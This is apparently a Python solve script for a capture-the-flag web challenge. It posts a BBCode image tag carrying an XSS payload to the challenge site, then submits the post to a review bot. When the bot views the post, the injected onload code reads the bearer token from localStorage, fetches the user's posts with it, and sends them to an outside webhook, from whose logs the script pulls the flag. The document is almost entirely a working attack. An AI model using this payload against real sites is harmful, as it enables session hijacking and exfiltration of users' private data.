
import sys
import requests
import re
import time
import random

WEBHOOK = "https://manini.alwaysdata.net/lit.php"
WEBHOOK_LOGS = "https://manini.alwaysdata.net/logs.txt"
XSS_PAYLOAD = "[img width=\"100 onload=fetch('/api/posts',{method:'GET',headers:{'Authorization':'Bearer'+String.fromCharCode(32)+localStorage.getItem('DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique')}}).then(r=>r.json()).then(data=>fetch('WEBHOOK',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'posts='+encodeURIComponent(JSON.stringify(data.items))}))\"]https://whitedukesdz.ninja/logo.png[/img]".replace("WEBHOOK", WEBHOOK)

session = requests.Session()
base_url = "https://bubble-tea.task.sasc.tf"
bot_url = "https://805cf29f-caff-4314-a75d-299c5d76ae12.kit.sasc.tf"

username = "user_" + str(random.randint(1000, 9999))
password = "pass_" + str(random.randint(1000, 9999))

def create_account():
    resp = session.post(f"{base_url}/api/auth/register/", json={"username": username, "password": password})
    print("Account created successfully.")
    return resp.json().get("access_token")

def create_post(access_token):
    resp = session.post(f"{base_url}/api/posts/", json={"content": XSS_PAYLOAD}, headers={"Authorization": f"Bearer {access_token}"})
    print("Post created successfully.")
    post = resp.json().get("post")
    return {"user_id": post.get("user_id"), "post_id": post.get("id")}

def submit_to_bot(user_id, post_id):
    resp = session.post(f"{bot_url}/review", json={"url": f"{base_url}/post/{user_id}/posts/{post_id}"})
    print("Submitted to bot successfully.")

def get_flag():
    resp = session.get(f"{WEBHOOK_LOGS}")
    match = re.search(r'(kaspersky\{.*?\})', resp.text, re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

def main():
    SLEEP = 10
    access_token = create_account()
    post_info = create_post(access_token)
    submit_to_bot(post_info["user_id"], post_info["post_id"])
    time.sleep(SLEEP) # waiting for bot to visit the post
    flag = get_flag()
    if flag:
        print(flag)
    else:
        print("Flag not found.")

main()
